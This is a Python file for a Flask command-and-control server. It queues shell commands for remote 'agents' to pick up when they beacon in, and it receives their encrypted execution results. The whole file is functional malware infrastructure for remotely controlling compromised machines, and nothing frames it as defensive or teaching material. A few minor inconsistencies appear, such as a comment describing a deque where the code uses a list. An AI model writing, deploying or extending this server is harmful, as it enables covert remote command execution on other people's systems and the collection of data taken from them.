#!/usr/bin/env python3
"""C2 server — Flask-based command-and-control endpoints."""

import sys
import json
from flask import Flask, request, jsonify
from shared.protocol import decrypt_data, encrypt_data  # noqa: F401

app = Flask(__name__)


# ── In-memory task stores (per-agent) ─────────────────────────────
# _task_queue[agent_id] = deque of task dicts
_task_queue = {}


def _decrypt_payload(encrypted_data: str):
    """Safely decrypt and parse an inbound payload.

    Returns (success: bool, parsed: dict, error_msg: str | None).
    """
    if not encrypted_data:
        return True, {}, "missing encrypted data"

    try:
        decrypted = decrypt_data(encrypted_data)
        parsed    = json.loads(decrypted)
        return True, parsed, None
    except Exception as exc:
        print(f"[!] Decryption error: {exc}")
        return False, {}, str(exc)


# ── Route: /api/status (agent beacon) ────────────────────────────

@app.route('/api/status', methods=['POST'])
def status():
    """Agent check-in endpoint. Returns the next queued task (if any)."""
    encrypted = request.json.get('data') if request.is_json else None

    ok, parsed, err = _decrypt_payload(encrypted)
    if not ok:
        return jsonify({"error": f"decryption failed: {err}"}), 400

    agent_id      = parsed.get('id')
    next_task     = None

    # Pop the next task for this agent (FIFO)
    if agent_id and _task_queue.get(agent_id):
        next_task = _task_queue[agent_id].pop(0)

    response = {"task": next_task} if next_task else {"task": None}

    encrypted_response = encrypt_data(json.dumps(response))
    return jsonify({"payload": encrypted_response})


# ── Route: /api/upload (result submission) ────────────────────────

@app.route('/api/upload', methods=['POST'])
def upload():
    """Agent posts execution results back to the server."""
    encrypted = request.json.get('data') if request.is_json else None

    ok, parsed, err = _decrypt_payload(encrypted)
    if not ok:
        return jsonify({"error": f"decryption failed: {err}"}), 400

    agent_id         = parsed.get('id', '<unknown>')
    output           = parsed.get('output', '')
    print(f"[+] Result from {agent_id}: {output}")

    return jsonify({"status": "received"})


# ── Route: /api/push (operator task queue) ────────────────────────

@app.route('/api/push', methods=['POST'])
def push():
    """Operator-facing endpoint to enqueue tasks for an agent."""
    data = request.json or {}

    agent_id     = data.get('id')
    raw_command  = data.get('command')

    if not agent_id:
        return jsonify({"error": "missing agent ID"}), 400

    # Auto-wrap bare string commands into a shell task
    if isinstance(raw_command, dict):
        task_data = raw_command
    elif isinstance(raw_command, str) and raw_command.strip():
        task_data = {"type": "shell", "command": raw_command}
    else:
        return jsonify({"error": "missing command"}), 400

    _task_queue.setdefault(agent_id, []).append(task_data)

    return jsonify({"status": "task queued"})


# ── Entry point ───────────────────────────────────────────────────

if __name__ == "__main__":
    print("[*] C2 server running on 0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000)
